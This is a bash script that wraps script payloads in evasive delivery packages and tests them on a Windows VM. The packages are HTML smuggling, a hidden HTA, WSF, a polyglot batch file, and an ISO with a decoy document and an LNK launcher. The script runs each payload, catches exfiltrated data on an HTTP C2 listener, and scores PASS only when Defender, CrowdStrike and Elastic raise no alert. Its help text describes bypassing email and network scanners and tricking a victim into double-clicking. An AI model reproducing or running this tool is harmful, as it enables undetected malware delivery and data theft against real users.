#!/bin/bash
# Unified deploy & test for non-PE payloads (JScript, VBScript, Batch)
# with delivery mechanism packaging.
#
# Usage:
#   deploy_script.sh <payload> [--format jscript|vbscript|batch]
#       [--delivery html_smuggling|hta|wsf|polyglot|iso|lnk|none]
#       [--c2-port PORT] [--timeout SECS]
#
# Format auto-detects from extension (.js=jscript, .vbs=vbscript, .bat/.cmd=batch).
# Delivery default: none (deploy raw script).
# For delivery options, see deploy_script.sh --help

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
PROJECT_DIR="$(dirname "$SCRIPT_DIR")"
TEMPLATE_DIR="$PROJECT_DIR/templates/chunks"

VM_PORT=${VM_PORT:-10022}
VM_USER=${VM_USER:-vmuser}
VM_PASS=${VM_PASS:-vmuser123}
C2_PORT=${C2_PORT:-9001}
TIMEOUT=${TIMEOUT:-120}
VM_SNAPSHOT=${VM_SNAPSHOT:-crowdstrike}
PAYLOAD=""
FORMAT=""
DELIVERY="none"

ssh_cmd() {
    sshpass -p "$VM_PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 -p "$VM_PORT" "$VM_USER@localhost" "$@"
}
scp_cmd() {
    sshpass -p "$VM_PASS" scp -o StrictHostKeyChecking=no -P "$VM_PORT" "$@"
}

usage() {
    cat <<'USAGE'
deploy_script.sh — unified deployer for JScript, VBScript, and Batch payloads

Usage: deploy_script.sh <payload_file> [OPTIONS]

Options:
  --format FORMAT      Force format: jscript, vbscript, batch (auto-detects from extension)
  --delivery METHOD    Package with delivery mechanism before deploying:
                         html_smuggling  — HTML page with embedded base64, auto-download
                         hta             — HTA wrapper (JScript/VBScript only)
                         wsf             — Windows Script File wrapper
                         polyglot        — Batch+script polyglot file
                         iso             — ISO container with .lnk launcher (JScript only)
                         lnk             — Print LNK command (no packaging, info only)
                         none            — Deploy raw script (default)
  --c2-port PORT       C2 listener port (default: 9001)
  --timeout SECS       C2 capture timeout (default: 120)
  --help               Show this help

Format auto-detection:
  .js     → jscript    (cscript //E:jscript)
  .vbs    → vbscript   (cscript //E:vbscript)
  .bat    → batch      (cmd /c)
  .cmd    → batch      (cmd /c)
  .hta    → hta        (mshta)
  .wsf    → wsf        (cscript)

Delivery methods:
  html_smuggling  Embeds payload as base64 in an HTML page. User opens HTML in browser,
                  payload downloads automatically. Bypasses email/network scanners.
  hta             Wraps script in an HTA file — runs via mshta.exe with full COM access.
                  No script execution policy restrictions.
  wsf             Wraps in Windows Script File (.wsf). Can embed multiple languages.
  polyglot        Creates a .bat that re-invokes itself as JScript or VBScript.
                  Victim double-clicks .bat, which silently runs the script payload.
  iso             Packages payload + decoy doc + .lnk launcher in an ISO image.
                  When mounted, user sees a document icon that actually runs the script.
  lnk             Prints the cscript/wscript/cmd command needed for a .lnk shortcut.
USAGE
    exit 0
}

# ── Parse arguments ──
if [ $# -eq 0 ]; then usage; fi

while [[ $# -gt 0 ]]; do
    case "$1" in
        --format)   FORMAT="$2"; shift 2 ;;
        --delivery) DELIVERY="$2"; shift 2 ;;
        --c2-port)  C2_PORT="$2"; shift 2 ;;
        --timeout)  TIMEOUT="$2"; shift 2 ;;
        --help|-h)  usage ;;
        -*)         echo "[!] Unknown option: $1"; exit 1 ;;
        *)
            if [ -z "$PAYLOAD" ]; then
                PAYLOAD="$1"
            fi
            shift ;;
    esac
done

if [ -z "$PAYLOAD" ] || [ ! -f "$PAYLOAD" ]; then
    echo "[!] Payload not found: ${PAYLOAD:-<none>}"
    exit 1
fi

# ── Auto-detect format ──
if [ -z "$FORMAT" ]; then
    ext="${PAYLOAD##*.}"
    case "$ext" in
        js)       FORMAT="jscript" ;;
        vbs)      FORMAT="vbscript" ;;
        bat|cmd)  FORMAT="batch" ;;
        hta)      FORMAT="jscript"; DELIVERY="hta" ;;
        wsf)      FORMAT="jscript" ;;
        *)        echo "[!] Cannot auto-detect format from .$ext — use --format"; exit 1 ;;
    esac
fi

# Validate delivery + format combinations
case "$DELIVERY" in
    hta)
        if [ "$FORMAT" = "batch" ]; then
            echo "[!] HTA delivery not supported for batch scripts"
            exit 1
        fi ;;
    iso)
        if [ "$FORMAT" != "jscript" ]; then
            echo "[!] ISO delivery currently only supports JScript (uses iso_package.py)"
            exit 1
        fi ;;
    polyglot)
        ;; # all formats supported
    html_smuggling|wsf|lnk|none)
        ;; # all formats supported
    *)
        echo "[!] Unknown delivery method: $DELIVERY"
        echo "    Valid: html_smuggling, hta, wsf, polyglot, iso, lnk, none"
        exit 1 ;;
esac

# ── Delivery packaging ──
DEPLOY_FILE="$PAYLOAD"
DEPLOY_NAME=$(basename "$PAYLOAD")
PACKAGED_FILES=()

package_delivery() {
    local outdir
    outdir="$(dirname "$PAYLOAD")"

    case "$DELIVERY" in
        none)
            return ;;

        html_smuggling)
            echo "[*] Packaging: HTML smuggling..."
            local tmpl="$TEMPLATE_DIR/${FORMAT}/delivery/html_smuggling.html"
            if [ ! -f "$tmpl" ]; then
                echo "[!] Template not found: $tmpl"
                exit 1
            fi
            local b64
            b64=$(base64 -w0 "$PAYLOAD")
            local outname="${DEPLOY_NAME%.*}_delivery.html"
            local outpath="$outdir/$outname"
            sed -e "s|{{PAYLOAD_B64}}|$b64|g" \
                -e "s|{{FILENAME}}|$DEPLOY_NAME|g" \
                -e "s|{{DOC_TITLE}}|Document Download|g" \
                "$tmpl" > "$outpath"
            DEPLOY_FILE="$outpath"
            DEPLOY_NAME="$outname"
            PACKAGED_FILES+=("$outpath")
            echo "  Created: $outpath ($(stat -c%s "$outpath") bytes)"
            ;;

        hta)
            echo "[*] Packaging: HTA wrapper..."
            local tmpl="$TEMPLATE_DIR/${FORMAT}/delivery/hta_wrapper.hta"
            if [ ! -f "$tmpl" ]; then
                # JScript uses a .js generator, not a direct .hta template
                # Build inline
                local outname="${DEPLOY_NAME%.*}.hta"
                local outpath="$outdir/$outname"
                local lang="JScript"
                [ "$FORMAT" = "vbscript" ] && lang="VBScript"
                {
                    echo '<html><head>'
                    echo '<HTA:APPLICATION ID="svc" SHOWINTASKBAR="no" WINDOWSTATE="minimize" BORDER="none" CAPTION="no" />'
                    echo "<script language=\"$lang\">"
                    cat "$PAYLOAD"
                    [ "$lang" = "JScript" ] && echo 'window.close();'
                    [ "$lang" = "VBScript" ] && echo 'self.close'
                    echo '</script></head><body></body></html>'
                } > "$outpath"
                DEPLOY_FILE="$outpath"
                DEPLOY_NAME="$outname"
                PACKAGED_FILES+=("$outpath")
                echo "  Created: $outpath ($(stat -c%s "$outpath") bytes)"
                return
            fi
            local body
            body=$(cat "$PAYLOAD")
            local outname="${DEPLOY_NAME%.*}.hta"
            local outpath="$outdir/$outname"
            python3 -c "
import sys
tmpl = open(sys.argv[1]).read()
body = open(sys.argv[2]).read()
print(tmpl.replace('{{PAYLOAD_BODY}}', body))
" "$tmpl" "$PAYLOAD" > "$outpath"
            DEPLOY_FILE="$outpath"
            DEPLOY_NAME="$outname"
            PACKAGED_FILES+=("$outpath")
            echo "  Created: $outpath ($(stat -c%s "$outpath") bytes)"
            ;;

        wsf)
            echo "[*] Packaging: WSF wrapper..."
            local tmpl="$TEMPLATE_DIR/${FORMAT}/delivery/wsf_wrapper.wsf"
            if [ ! -f "$tmpl" ]; then
                echo "[!] Template not found: $tmpl"
                exit 1
            fi
            local outname="${DEPLOY_NAME%.*}.wsf"
            local outpath="$outdir/$outname"
            python3 -c "
import sys
tmpl = open(sys.argv[1]).read()
body = open(sys.argv[2]).read()
print(tmpl.replace('{{PAYLOAD_BODY}}', body))
" "$tmpl" "$PAYLOAD" > "$outpath"
            DEPLOY_FILE="$outpath"
            DEPLOY_NAME="$outname"
            PACKAGED_FILES+=("$outpath")
            echo "  Created: $outpath ($(stat -c%s "$outpath") bytes)"
            ;;

        polyglot)
            echo "[*] Packaging: polyglot batch..."
            local outname="${DEPLOY_NAME%.*}_polyglot.bat"
            local outpath="$outdir/$outname"
            case "$FORMAT" in
                jscript)
                    local tmpl="$TEMPLATE_DIR/jscript/delivery/polyglot_bat.bat"
                    python3 -c "
import sys
tmpl = open(sys.argv[1]).read()
body = open(sys.argv[2]).read()
print(tmpl.replace('{{PAYLOAD_BODY}}', body))
" "$tmpl" "$PAYLOAD" > "$outpath"
                    ;;
                vbscript)
                    local tmpl="$TEMPLATE_DIR/batch/delivery/polyglot_vbs.bat"
                    python3 -c "
import sys
tmpl = open(sys.argv[1]).read()
body = open(sys.argv[2]).read()
print(tmpl.replace('{{VBS_BODY}}', body))
" "$tmpl" "$PAYLOAD" > "$outpath"
                    ;;
                batch)
                    echo "  Batch doesn't need polyglot wrapping — it already IS batch."
                    return ;;
            esac
            DEPLOY_FILE="$outpath"
            DEPLOY_NAME="$outname"
            PACKAGED_FILES+=("$outpath")
            echo "  Created: $outpath ($(stat -c%s "$outpath") bytes)"
            ;;

        iso)
            echo "[*] Packaging: ISO container..."
            local iso_script="$TEMPLATE_DIR/jscript/delivery/iso_package.py"
            if [ ! -f "$iso_script" ]; then
                echo "[!] iso_package.py not found"
                exit 1
            fi
            local outname="${DEPLOY_NAME%.*}.iso"
            local outpath="$outdir/$outname"
            python3 "$iso_script" "$PAYLOAD" "$outpath"
            DEPLOY_FILE="$outpath"
            DEPLOY_NAME="$outname"
            PACKAGED_FILES+=("$outpath")
            echo "  Created: $outpath ($(stat -c%s "$outpath") bytes)"
            ;;

        lnk)
            echo "[*] LNK shortcut info:"
            case "$FORMAT" in
                jscript)  echo "  Target: cscript //nologo //E:jscript \"PAYLOAD_PATH\"" ;;
                vbscript) echo "  Target: cscript //nologo //E:vbscript \"PAYLOAD_PATH\"" ;;
                batch)    echo "  Target: cmd /c \"PAYLOAD_PATH\"" ;;
            esac
            echo "  Note: LNK creation requires Windows (COM/PowerShell). Upload .js/.vbs and create LNK on target."
            echo "  PowerShell: \$s=(New-Object -ComObject WScript.Shell).CreateShortcut('doc.lnk'); \$s.TargetPath='cscript'; \$s.Arguments='//nologo payload.js'; \$s.Save()"
            return ;;
    esac
}

# Determine exec command for the format
get_exec_cmd() {
    local remote_path="C:\\Users\\$VM_USER\\Desktop\\$DEPLOY_NAME"
    local ext="${DEPLOY_NAME##*.}"
    case "$ext" in
        js)   echo "cscript //nologo //E:jscript \"$remote_path\"" ;;
        vbs)  echo "cscript //nologo //E:vbscript \"$remote_path\"" ;;
        bat|cmd) echo "cmd /c \"$remote_path\"" ;;
        hta)  echo "mshta \"$remote_path\"" ;;
        wsf)  echo "cscript //nologo \"$remote_path\"" ;;
        html) echo "start \"\" \"$remote_path\"" ;;
        iso)  echo "echo ISO needs manual mount — double-click in Explorer" ;;
        *)    echo "cmd /c \"$remote_path\"" ;;
    esac
}

cleanup() {
    echo ""
    # Clean up packaged delivery files on host
    for pf in "${PACKAGED_FILES[@]}"; do
        [ -f "$pf" ] && rm -f "$pf" 2>/dev/null || true
    done
    echo "[*] Restoring VM snapshot..."
    if "$SCRIPT_DIR/vm_snapshot.sh" restore "$VM_SNAPSHOT" 2>/dev/null; then
        echo "  OK (restored $VM_SNAPSHOT)"
    else
        echo "  No snapshot to restore, cleaning up manually..."
        ssh_cmd "del /f \"C:\\Users\\$VM_USER\\Desktop\\$DEPLOY_NAME\" 2>nul & taskkill /f /im cscript.exe 2>nul & taskkill /f /im wscript.exe 2>nul & taskkill /f /im mshta.exe 2>nul & taskkill /f /im cmd.exe 2>nul" 2>/dev/null || true
        echo "  Done"
    fi
    fuser -k $C2_PORT/tcp 2>/dev/null || true
}
trap cleanup EXIT

# ── Main ──

echo ""
echo "============================================"
echo "  SCRIPT DEPLOY & TEST"
echo "============================================"
echo "  Payload:   $PAYLOAD"
echo "  Format:    $FORMAT"
echo "  Delivery:  $DELIVERY"
echo "  C2 Port:   $C2_PORT"
echo "  Timeout:   ${TIMEOUT}s"
echo "============================================"
echo ""

# Package delivery
package_delivery

# If delivery was lnk (info only), exit
if [ "$DELIVERY" = "lnk" ]; then
    exit 0
fi

# Step 1: Check VM alive
echo "[1/6] Checking VM connectivity..."
if ! ssh_cmd "echo VM_ALIVE" 2>/dev/null | tr -d '\r' | grep -q "VM_ALIVE"; then
    echo "[!] VM not reachable on port $VM_PORT"
    exit 1
fi
echo "  OK"

# Step 2: Upload payload
echo "[2/6] Uploading $DEPLOY_NAME..."
scp_cmd "$DEPLOY_FILE" "$VM_USER@localhost:Desktop\\$DEPLOY_NAME" 2>/dev/null
echo "  OK — uploaded $(stat -c%s "$DEPLOY_FILE") bytes"

# Step 3: Check Defender status
echo "[3/6] Checking Defender status..."
DEFENDER_STATUS=$(ssh_cmd 'powershell -Command "Get-MpComputerStatus | Select-Object AMServiceEnabled,RealTimeProtectionEnabled | Format-List"' 2>/dev/null | tr -d '\r')
echo "  $DEFENDER_STATUS" | head -4 | sed 's/^/  /'

# Verify binary survived upload
sleep 2
EXISTS=$(ssh_cmd "if exist \"C:\\Users\\$VM_USER\\Desktop\\$DEPLOY_NAME\" (echo EXISTS) else (echo GONE)" 2>/dev/null | tr -d '\r')
if echo "$EXISTS" | grep -q "GONE"; then
    echo "  [!] QUARANTINED — Defender caught the payload on upload"
    ssh_cmd 'powershell -Command "Get-MpThreatDetection | Select-Object -Last 1 | Format-List"' 2>/dev/null | tr -d '\r' | sed 's/^/    /'
    exit 2
fi
echo "  Payload survived Defender scan"

# Step 4: Start HTTP C2 listener
echo "[4/6] Starting HTTP C2 listener on :$C2_PORT..."
fuser -k $C2_PORT/tcp 2>/dev/null || true
sleep 1

C2_LOG="/tmp/c2_deploy_$(date +%Y%m%d_%H%M%S).log"
EXFIL_FILE="/tmp/exfil_deploy_$(date +%Y%m%d_%H%M%S).bin"

python3 -u -c "
import http.server, sys, time
port, timeout = int(sys.argv[1]), int(sys.argv[2])
out = sys.argv[3]
total = 0

class H(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        global total
        n = int(self.headers.get('Content-Length', 0))
        data = self.rfile.read(n) if n else b''
        with open(out, 'ab') as f:
            f.write(data)
        total += len(data)
        self.send_response(200)
        self.send_header('Content-Length', '2')
        self.end_headers()
        self.wfile.write(b'OK')
        print(f'POST {self.path}: {len(data)}B (total: {total}B)', flush=True)
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-Length', '2')
        self.end_headers()
        self.wfile.write(b'OK')
    def log_message(self, *a): pass

srv = http.server.HTTPServer(('0.0.0.0', port), H)
srv.timeout = 1
deadline = time.time() + timeout
print(f'HTTP C2 on :{port} -> {out} (timeout {timeout}s)', flush=True)
while time.time() < deadline:
    srv.handle_request()
    if total > 0 and time.time() > deadline - timeout + 30:
        break
srv.server_close()
print(f'Done: {total}B received -> {out}', flush=True)
" "$C2_PORT" "$TIMEOUT" "$EXFIL_FILE" > "$C2_LOG" 2>&1 &
C2_PID=$!
sleep 1

if ! kill -0 $C2_PID 2>/dev/null; then
    echo "  [!] C2 listener failed to start"
    cat "$C2_LOG" 2>/dev/null | tail -5 | sed 's/^/    /'
    exit 1
fi
echo "  OK — PID $C2_PID (timeout: ${TIMEOUT}s)"

# Step 5: Execute on VM
EXEC_CMD=$(get_exec_cmd)
echo "[5/6] Executing: $EXEC_CMD"
ssh_cmd "cmd /c $EXEC_CMD" >/dev/null 2>&1 &
EXEC_PID=$!

echo "  Waiting for C2 data..."
wait $C2_PID 2>/dev/null || true
wait $EXEC_PID 2>/dev/null || true

# Step 6: Validate results
echo "[6/6] Validating results..."
echo ""

EXFIL_SIZE=0
if [ -f "$EXFIL_FILE" ]; then
    EXFIL_SIZE=$(stat -c%s "$EXFIL_FILE" 2>/dev/null || echo 0)
fi

# Check Defender detections
DEFENDER_DETECTIONS=$(ssh_cmd 'powershell -Command "(Get-MpThreatDetection | Where-Object { $_.InitialDetectionTime -gt (Get-Date).AddMinutes(-5) }).Count"' 2>/dev/null | tr -d '\r' | grep -E '^[0-9]+$' || echo "0")

# Check CrowdStrike
CS_STATUS="n/a"
CS_EVENTS="0"
if ssh_cmd 'sc query csfalconservice' 2>/dev/null | tr -d '\r' | grep -q "RUNNING"; then
    CS_STATUS="active"
    CS_EVENTS=$(ssh_cmd 'powershell -Command "(Get-WinEvent -LogName \"CrowdStrike Falcon/Operational\" -MaxEvents 50 -ErrorAction SilentlyContinue | Where-Object { $_.TimeCreated -gt (Get-Date).AddMinutes(-5) -and $_.LevelDisplayName -match \"Warning|Error|Critical\" }).Count"' 2>/dev/null | tr -d '\r' | grep -E '^[0-9]+$' || echo "0")
fi

# Check Elastic alerts
ELASTIC_ALERTS="0"
if command -v curl &>/dev/null; then
    ELASTIC_ALERTS=$(curl -sk -u elastic:changeme "https://localhost:9200/.alerts-security*/_search?size=100" 2>/dev/null | python3 -c "
import json, sys
DEPLOY_NOISE = {'schtasks.exe','tasklist.exe','HOSTNAME.EXE','hostname.exe','cmd.exe','sshd.exe','reg.exe','cscript.exe','wscript.exe','mshta.exe'}
data = json.load(sys.stdin)
count = 0
for h in data.get('hits',{}).get('hits',[]):
    s = h.get('_source',{})
    proc = s.get('process',{}).get('name','')
    parent = s.get('process',{}).get('parent',{}).get('name','')
    if proc in DEPLOY_NOISE or parent in ('sshd.exe','cmd.exe'):
        continue
    count += 1
print(count)
" 2>/dev/null || echo "0")
fi

echo "============================================"
echo "  RESULTS"
echo "============================================"
echo "  Format:           $FORMAT"
echo "  Delivery:         $DELIVERY"
echo "  C2 data:          $EXFIL_SIZE bytes"
echo "  Exfil file:       ${EXFIL_FILE}"
echo "  Defender:         $DEFENDER_DETECTIONS detections"
echo "  CrowdStrike:      ${CS_STATUS} — $CS_EVENTS events"
echo "  Elastic alerts:   $ELASTIC_ALERTS"
echo "============================================"

if [ "$EXFIL_SIZE" -gt 0 ] && [ -f "$EXFIL_FILE" ]; then
    echo ""
    echo "  Data preview:"
    strings "$EXFIL_FILE" | head -10 | sed 's/^/    /'
fi

# Copy exfil to results/latest if it exists
if [ "$EXFIL_SIZE" -gt 0 ] && [ -d "$PROJECT_DIR/results/latest" ]; then
    cp "$EXFIL_FILE" "$PROJECT_DIR/results/latest/" 2>/dev/null || true
fi

if [ "$EXFIL_SIZE" -gt 0 ] && [ "$DEFENDER_DETECTIONS" = "0" ] && [ "$ELASTIC_ALERTS" = "0" ] && [ "$CS_EVENTS" = "0" ]; then
    echo ""
    echo "  OVERALL: PASS"
    exit 0
else
    echo ""
    echo "  OVERALL: FAIL"
    [ "$EXFIL_SIZE" -eq 0 ] && echo "    - No C2 data received"
    [ "$DEFENDER_DETECTIONS" != "0" ] && echo "    - Defender detected ($DEFENDER_DETECTIONS threats)"
    [ "$CS_EVENTS" != "0" ] && echo "    - CrowdStrike events ($CS_EVENTS)"
    [ "$ELASTIC_ALERTS" != "0" ] && echo "    - Elastic alerts fired ($ELASTIC_ALERTS)"
    exit 1
fi
